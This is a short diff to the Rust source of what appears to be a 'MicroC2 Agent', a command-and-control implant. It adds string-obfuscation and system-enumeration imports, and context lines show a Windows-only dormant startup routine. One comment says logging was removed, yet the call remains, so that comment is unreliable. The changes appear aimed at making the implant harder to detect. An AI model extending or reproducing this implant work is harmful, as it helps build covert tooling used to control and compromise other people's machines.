@@ -16,6 +16,9 @@ use log::{info, warn, error};
 use std::env;
 use std::sync::Arc;
 use std::time::Duration;
+use obfstr::obfstr;
+use sysinfo::{System, RefreshKind};
+use std::ffi::OsStr;
 
 
 // Dormant startup function
@@ -41,7 +44,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     #[cfg(target_os = "windows")]
     dormant_startup();
 
-    env_logger::init();
+    env_logger::init(); // Removed for size reduction
     info!("[STARTUP] MicroC2 Agent starting...");
 
     let config = AgentConfig::load()?;
